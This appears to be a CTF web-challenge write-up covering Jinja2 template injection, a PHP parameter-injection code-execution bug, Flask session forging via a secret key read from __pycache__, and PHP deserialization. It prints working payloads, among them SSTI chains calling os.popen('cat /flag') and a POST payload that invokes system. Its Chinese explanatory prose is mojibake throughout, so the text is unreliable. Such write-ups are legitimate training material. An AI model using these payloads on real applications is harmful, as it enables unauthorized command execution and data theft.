<p>å¯ä»¥ç›´æ¥æ‹¿å»è§£ç ï¼Œè¿™é‡Œçš„<code>%3d</code>æ˜¯<code>=</code>ï¼Œæ‰€ä»¥å¯ä»¥å…ˆçŒœæµ‹æ˜¯base64</p>
<p><img src="https://img-blog.csdnimg.cn/62729a4795ec45c488e111424bc6158d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>Gunzipè§£å¯†ä¹‹åå°±æ˜¯æˆ‘ä»¬åŸæœ¬çš„æˆç»©äº†</p>
<p>ç›´æ¥ç™¾åº¦ï¼Œå¯ä»¥çŸ¥é“åŠ å¯†æ–¹å¼æ˜¯<code>Gzip</code></p>
<p>é‚£ä¹ˆå°±ç›´æ¥ç”¨301ä¸€æ­¥ä¸€æ­¥åŠ å¯†å›å»ï¼Œåœ¨score.phpç•Œé¢æŠ“åŒ…ï¼Œä¿®æ”¹ä¸€ä¸‹sessionå°±å¥½äº†</p>
<p>payloao:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">H4sIAGWo6WEA/wXAAQkAAADCsEoe+3cbXwAStPRXAwAAAA==</span><br></pre></td></tr></table></figure>



<h5 id="04-template"><a href="#04-template" class="headerlink" title="04-template"></a>04-template</h5><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„æ¨¡æ¿æ³¨å…¥</p>
<p>jinjia</p>
<p>ç›´æ¥æ‰“payloadå°±å¥½äº†ï¼Œè¿™é‡Œé€‰æ‹©<code>catch_warnings</code>ï¼Œç›´æ¥å†™ä¸ªè„šæœ¬æ‰¾å§ï¼Œå®åœ¨ä¸è¡Œä¸€ä¸ªä¸€ä¸ªæ•°</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="05-php"><a href="#05-php" class="headerlink" title="05-php"></a>05-php</h5><p>é™‡åŸæˆ˜å½¹çš„é¢˜ç›®ï¼Œä½†æ˜¯è¢«æ”¹è¿‡äº†ï¼Œç›´æ¥çœ‹hintçš„phpinfoå°±å¯ä»¥æ‰¾åˆ°flag</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:4:&quot;Hint&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Ezhttpd"><a href="#Ezhttpd" class="headerlink" title="Ezhttpd"></a>Ezhttpd</h5><p>ç®€å•çš„ä»£ç å®¡è®¡</p>
<p>å°±ä»¥åˆšçœ‹åˆ°è¿™é“é¢˜çš„æ—¶å€™çš„é¡ºåºï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªæ–‡ä»¶å®¡è®¡ï¼š</p>
<p><strong>0x01:index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;evil.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> Temp(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;display(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>åŒ…å« <code>evil.php</code>ï¼Œå®ä¾‹åŒ–<code>Temp</code>ç±»ï¼Œpostä¼ å€¼ï¼Œgetä¼ filenameåˆ°displayå‡½æ•°ä¸­</p>
<p><strong>0x02:evil.php</strong></p>
<p>// é‡ç‚¹ï¼ï¼  çœ‹å®Œè¿˜æ˜¯å¯¹æ–¹æ³•æœ‰å›°æƒ‘çš„å¯ä»¥ç™¾åº¦  â€œphpé­”æœ¯æ–¹æ³•â€  ç”šè‡³å¯ä»¥å»è‡ªå­¦é¢å‘å¯¹è±¡</p>
<p>1.è¿™é‡Œä¸»è¦å°±æ˜¯<code>Temp</code>ç±»ï¼ŒæŸ¥çœ‹é€ä¸ªæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;date = array_merge(<span class="keyword">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__construct</code> æ„é€ æ–¹æ³•ï¼Œåœ¨å®ä¾‹åŒ–ç±»çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨index.phpåˆ©ç”¨postä¼ çš„å€¼å°±æ˜¯è¿™é‡Œ$dataçš„å€¼ï¼›</p>
<p><code>array_merge</code>åˆå¹¶ä¸¤ä¸ªæ•°ç»„ï¼›</p>
<p>2.<code>getTempName</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = str_replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_file(<span class="keyword">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥ç›¸åº”å‚æ•°ï¼Œè¦æ±‚<code>$dir===&#39;admin&#39;</code>å¹¶ä¿®æ”¹<code>$this-&gt;template</code>çš„å€¼ï¼›</p>
<p><code>str_replace</code>å­—ç¬¦ä¸²æ›¿æ¢å‡½æ•°ï¼›</p>
<p>3.<code>display</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;date);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getTempName(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>extract</code>å¯¹<code>$this-&gt;data</code>çš„å€¼è¿›è¡Œå˜é‡è¦†ç›–ï¼š</p>
<p>ä¹‹åè°ƒç”¨<code>getTempName</code>æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¼šæŠŠdisplayé»˜è®¤çš„å‚æ•°<code>$space</code>å†æ¬¡ä¼ å…¥<code>getTemlName</code>ï¼Œåˆ«å¿˜äº†æˆ‘ä»¬ä¹‹å‰å®¡è®¡çš„ä»£ç ä¸­è¦æ±‚ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°è¦ä¸º<code>admin</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¹Ÿè¦å®ç°å¯¹spaceçš„ä¿®æ”¹ï¼Œè€Œç”±äºæœ‰å˜é‡è¦†ç›–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨postä¼ sapceä¸ºadminï¼Œä»è€Œä½¿å¾—spaceè¿›å…¥<code>$this-&gt;date</code>ï¼Œå®ç°åœ¨å˜é‡è¦†ç›–çš„æ—¶å€™è€Œæ–¹æ³•ä¸­å¯¹<code>$this-&gt;template</code>è¿›è¡Œäº†ä¿®æ”¹ï¼Œå¹¶åœ¨æœ€ååŒ…å«<code>$this-&gt;template</code>è¡¨ç¤ºçš„æ–‡ä»¶</p>
<p>4.<code>listdata</code></p>
<p>è¿™ä¸ªæ–¹æ³•ä¸œè¥¿æœ‰ç‚¹å¤šï¼Œæˆ‘å°±æŠŠæœ€ä¸»è¦çš„æ‹¿å‡ºæ¥å§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$params</span> = explode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">    <span class="variable">$var</span> = substr(<span class="variable">$t</span>, <span class="number">0</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">    <span class="variable">$val</span> = substr(<span class="variable">$t</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123;</span><br><span class="line">         <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>: </span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&#x27;nameå‚æ•°ä¸å­˜åœ¨&#x27;</span>;</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (!function_exists(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&#x27;å‡½æ•°[&#x27;</span>.<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;]æœªå®šä¹‰&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$force</span>) &#123;</span><br><span class="line">         <span class="variable">$p</span> = [];</span><br><span class="line">         <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">             <span class="keyword">if</span> (strpos(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                 <span class="variable">$n</span> = intval(substr(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                 <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line">              <span class="variable">$rt</span> = call_user_func_array(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="variable">$rt</span> = call_user_func(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p><code>explode</code>å°†<code>$_params</code>ä»¥ç©ºæ ¼è¿›è¡Œåˆ†å‰²å¹¶è¿”å›æ•°ç»„å½¢å¼ï¼Œä½¿å¾—ä¹‹åçš„éå†å’Œèµ‹å€¼å¾—ä»¥å®ç°ï¼ˆè‡ªå·±å»çœ‹æºç ç†è§£</p>
<p>æ¥ä¸‹å»ç¬¬ä¸€æ®µï¼Œåˆ¤æ–­<code>$param[&#39;name&#39;]</code>æ˜¯å¦ä¸ºå®šä¹‰å¹¶ä¸”æ˜¯å¦ä¸ºå‡½æ•°ï¼›</p>
<p>ç¬¬äºŒæ®µï¼Œåˆ¤æ–­<code>$force</code>æ˜¯å¦å®šä¹‰ï¼Œè‹¥å·²å®šä¹‰é‚£ä¹ˆå†éå†<code>$param</code>å¹¶åˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>param</code>é”®å€¼ï¼Œè‹¥å­˜åœ¨é‚£ä¹ˆå°±ç»™<code>$p</code>èµ‹å€¼ï¼Œè‹¥<code>$p</code>è¢«èµ‹å€¼é‚£ä¹ˆè¿›å…¥ä¸‹é¢çš„ifï¼Œåˆ©ç”¨<code>call_user_func_array</code>å‡½æ•°æ‰§è¡Œ<code>$param[&#39;name&#39;]</code>å‡½æ•°ï¼Œè€Œ<code>$p</code>çš„å€¼åˆ™ä¸ºè¯¥å‡½æ•°çš„å‚æ•°</p>
<p><strong>0x03:admin/index.htmk</strong></p>
<p>å‘ç°ä¸‰è¡Œphpä»£ç ï¼Œçœ‹è¿™ä¸‰ä¸ªå˜é‡<code>$img  $version  $mod</code>ï¼Œå‰é¢ä¸¤ä¸ªæ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Œæ­£å¼<code>Temp</code>ç±»ä¸­<code>date</code>æ•°ç»„é‡Œé¢çš„ï¼Œè€Œç»è¿‡å˜é‡è¦†ç›–ä¹‹åæˆ‘ä»¬å¯ä»¥è°ƒç”¨ï¼Œé‚£ä¹ˆè¿™é‡Œçš„<code>$mod</code>ä¸æ˜¯åŸæ•°ç»„é‡Œé¢çš„ï¼Œé‚£ä¹ˆè¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¼ å‚ä»è€Œå®ç°è°ƒç”¨<code>$mod</code>ï¼Œç„¶åè¿›å…¥listdataæ–¹æ³•ï¼Œç»•è¿‡ä¸€ä¸ªä¸ªifè¯­å¥åˆ°æœ€åçš„<code>call_user_func_array($param[&#39;name&#39;], $p)</code>è¿›è¡Œä»£ç æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&lt;?php echo $img;?&gt;&quot;&gt;</span><br><span class="line">&lt;div&gt;&lt;?php echo $this-&gt;listdata(&quot;action=list module=$mod&quot;);?&gt;&lt;div&gt;</span><br><span class="line">&lt;h6&gt;version: &lt;?php echo $version;?&gt;&lt;/h6&gt;</span><br></pre></td></tr></table></figure>

<p><strong>0x04:è§£é¢˜+æ€»ç»“</strong></p>
<p>ç°åœ¨ä»£ç éƒ½èµ°ä¸€éäº†ï¼Œä½†æ˜¯è¦æ€ä¹ˆè°ƒç”¨<code>call_user_func_array</code>ï¼Œè¿˜æ˜¯æœ‰ç‚¹è¿·æƒ‘ï¼Œè¿™é‡Œé‡ç‚¹åœ¨äº<code>explode</code>å‡½æ•°ï¼Œå› ä¸ºä»–ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„<code>mod</code>é€šè¿‡ç©ºæ ¼åˆ†éš”å‡ºæ¥ï¼Œå°±æ¯”å¦‚æºä»£ç æ˜¯<code>action=list module=$mod</code>ï¼Œæœ€åå°±ä¼šè¢«åˆ†æˆ<code>action=list</code>å’Œ<code>module=$mod</code>,é‚£ä¹ˆå¦‚æœæˆ‘ä»¬<code>$mod</code>ä¼ å…¥çš„æ—¶å€™å°±ä¼šè‡ªå¸¦ç©ºæ ¼å‘¢ï¼Œç›´æ¥ä¸¾ä¸ªä¾‹å­å§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;action=list module=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//array(2) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(11) &quot;action=list&quot;</span></span><br><span class="line"><span class="comment">//  [1]=&gt;</span></span><br><span class="line"><span class="comment">//  string(8) &quot;module=a&quot;    </span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a action=function name=1&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;action=list module=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//array(4) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(11) &quot;action=list&quot;    </span></span><br><span class="line"><span class="comment">//  [1]=&gt;</span></span><br><span class="line"><span class="comment">//  string(8) &quot;module=a&quot;        </span></span><br><span class="line"><span class="comment">//  [2]=&gt;</span></span><br><span class="line"><span class="comment">//  string(15) &quot;action=function&quot;</span></span><br><span class="line"><span class="comment">//  [3]=&gt;</span></span><br><span class="line"><span class="comment">//  string(6) &quot;name=1&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<p>æ¸…æ™°æ˜äº†ï¼Œå› ä¸ºåœ¨éå†ä¸­ä¼šå‡ºç°ä¸¤æ¬¡<code>action</code>ï¼Œé‚£ä¹ˆå‰é¢çš„listè‚¯å®šå°±ä¼šè¢«åé¢çš„functionç»™è¦†ç›–äº†å‘€ï¼Œé‚£ä¹ˆåº”è¯¥éƒ½æ‡‚äº†æœ€åæˆ‘ä»¬<code>$mod</code>çš„æ„é€ æ–¹æ³•äº†å§ï¼Œé‚£ä¹‹ååªè¦æ ¹æ®ä»£ç æ„é€ æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿å°±å¥½äº†</p>
<p>payload:</p>
<p>ï¼ˆä¸ºä»€ä¹ˆè¦ç”¨%09å‘¢ï¼Œdddd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">filename=index.html</span><br><span class="line">post:</span><br><span class="line">space=admin &amp;</span><br><span class="line">mod=1 action=function name=system force=1 param=ls%09/</span><br></pre></td></tr></table></figure>

<h5 id="EasyPython"><a href="#EasyPython" class="headerlink" title="EasyPython"></a>EasyPython</h5><p>å·¥å…·ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager">flask session</a></p>
<p>flask sessionä¼ªé€  + ç®€å•çš„æ¨¡æ¿æ³¨å…¥</p>
<p>æ—¢ç„¶é¢˜ç›®è¯´æ˜¯pythonï¼Œé‚£ä¹ˆç›´æ¥è¯•ç€åœ¨filenameä¸ŠæŸ¥çœ‹<code>app,py</code>,å¯ä»¥ç›´æ¥å¾—åˆ°æºç </p>
<p><strong>0x01:</strong></p>
<p>å­˜åœ¨secret_key <code>app.config[&#39;SECRET_KEY&#39;]=secret.SECRET_KEY</code>ï¼Œè€ŒSECRET_KEYå–å€¼äºåœ¨secret.pyæ–‡ä»¶ä¸­</p>
<p><strong>0x02:/source</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source</span>():</span></span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>,<span class="string">&#x27;jinchengshu.jpg&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.py&quot;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        f = <span class="string">&quot;&quot;</span>.join(<span class="built_in">open</span>(__file__,<span class="string">&#x27;r&#x27;</span>).readlines())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nononono! you too young!give you source!! &lt;br&gt;&quot;</span>+f</span><br><span class="line">    f = <span class="string">&quot;let&#x27;s look look shuaige&#x27;s pho;He is so handsome. He used to be called jinchengwu, but now he is called jinchengshu;&lt;br&gt;&lt;br&gt;&quot;</span></span><br><span class="line">    f += <span class="string">&quot;&lt;img src=data:image/jpeg;base64,&quot;</span>+base64.b64encode(<span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>).read()).decode()+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.getæ–¹å¼ä¼ filenameå¹¶å¯¹å…¶å†…å®¹è¿›è¡Œè¿›è¡Œåˆ¤æ–­ï¼Œä»¥<code>.py</code>ä¸ºç»“å°¾ã€åŒ…å«<code>flag or ..</code>åˆ™è¿”å›å½“å‰æ–‡ä»¶çš„å†…å®¹</p>
<p>2.<code>base64.b64encode(open(filename,&#39;rb&#39;).read()).decode()</code>å®ç°è¯»å–æ–‡ä»¶çš„æºç </p>
<p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥<code>SECRET_KEY</code>åœ¨secretæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”è¿˜å¯ä»¥é€šè¿‡ä»£ç å¾—åˆ°æºç ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆç»•è¿‡ç¬¬ä¸€ä¸ªifå¹¶ä¸”è¯»å–å‡ºsecret.pyæ–‡ä»¶é‡Œé¢çš„å†…å®¹</p>
<p>hintï¼š <code>__pycache__</code> ï¼ˆè‡ªè¡Œç™¾åº¦å§</p>
<p>ç™¾åº¦ä¹‹åå¹¶æµ‹è¯•ä¹‹åå¯ä»¥å¾—åˆ°æ–‡ä»¶çš„è·¯å¾„æ˜¯</p>
<p>payload1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=./__pycache__/secret.cpython-35.pyc ï¼ˆè¿™é‡Œçš„35æ˜¯pythonçš„ç‰ˆæœ¬ï¼Œå› ä¸ºæœ¬åœ°æµ‹è¯•çš„æ—¶å€™39ï¼Œä½†é¢˜ç›®çš„pythonç‰ˆæœ¬çš„3.5</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥å¾—åˆ°æºç ï¼Œè§£å¯†å¾—åˆ°Secret-Key</p>
<p><strong>0x03:/ssti</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(session)</span><br><span class="line">    info = session[<span class="string">&quot;info&quot;</span>]</span><br><span class="line">    data = request.form.get(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> info[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(data)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have one more try young man&quot;</span></span><br></pre></td></tr></table></figure>

<p>1.è¿™é‡Œåªæœ‰ä¸€ä¸ªç‚¹å°±æ˜¯<code>info[&quot;admin&quot;]==&quot;admin&quot;</code>ï¼Œç­‰å¼æˆåŠŸä¹‹åå°±ä¼šå¯¼è‡´<code>render_template_string(data)</code>ï¼Œå¯¹dataçš„å€¼è¿›è¡Œæ¸²æŸ“é€ æˆæ¨¡æ¿æ³¨å…¥</p>
<p>æ³¨æ„è¿™é‡Œçš„infoçš„å€¼æ¥è‡ªäºsessionï¼Œé‚£ä¹ˆç›´æ¥æŸ¥çœ‹sessionæ˜¯ä»€ä¹ˆæ ·çš„ã€‚å¯ä»¥å‘ç°sessionè¢«åˆ†æˆäº†ä¸‰æ®µï¼Œå†æ ¹æ®é¢˜ç›®flaskï¼Œå¯ä»¥å¤§èƒ†çŒœæµ‹æ˜¯flask sessionä¼ªé€ ï¼ˆä¸»è¦æ˜¯ä¹‹å‰åšè¿‡åŒç±»å‹é¢˜ç›®</p>
<p><img src="http://82.156.2.166/static/img/image-20211129183924992.png"></p>
<p>æ—¢ç„¶å‰é¢å·²ç»æ‹¿åˆ°<code>SECRET_KEY</code>äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥ç”¨å·¥å…·åŠ å¯†ï¼Œç„¶åä¿®æ”¹sessionï¼Œä¼ dataè¿›è¡Œæ¨¡æ¿æ³¨å…¥</p>
<p>payload2ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessionï¼šeyJpbmZvIjp7ImFkbWluIjoiYWRtaW4ifX0.YaN-KQ.tuTHvwPH5IxVm0ct06b9d8F1iZc </span><br></pre></td></tr></table></figure>

<p>payload3ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[375].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Ezunser"><a href="#Ezunser" class="headerlink" title="Ezunser"></a>Ezunser</h5><p>ååºåˆ—åŒ–æœªå®šä¹‰çš„ç±»</p>
<p>ç›´æ¥ç»™äº†æºç ï¼š</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAutoloader</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$classname</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    spl_autoload_register(<span class="string">&#x27;myAutoloader&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Evil/&quot;</span>,<span class="variable">$raw</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Evil Classes!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    var_dump(<span class="variable">$o</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;EvillClass.php&quot;</span>;</span><br><span class="line">    highlight_file(<span class="string">&quot;EvilClass.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x01:</strong></p>
<p>å…ˆå®¡è®¡<code>index.php</code></p>
<p>ç¬¬ä¸€ä¸ªç‚¹åœ¨äº<code>spl_autoload_register</code>ï¼Œå½“è°ƒç”¨<code>index.php</code>ä¸­æ²¡æœ‰å®šä¹‰çš„ç±»çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>myAutoloader($classname)</code>ï¼Œå…¶ä¸­<code>$classname</code>å°±æ˜¯æˆ‘ä»¬æƒ³å®ä¾‹åŒ–çš„ç±»</p>
